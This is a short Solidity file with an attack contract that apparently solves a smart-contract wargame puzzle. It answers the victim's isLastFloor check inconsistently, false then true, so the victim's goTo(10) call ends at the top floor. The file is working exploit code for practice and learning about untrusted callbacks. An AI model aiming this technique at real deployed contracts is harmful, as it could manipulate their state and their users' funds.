// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Elevator {
    function goTo(uint) external;
}

contract ElevatorAttack {
  bool public isLast = true;
  
  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(10);
  }
}
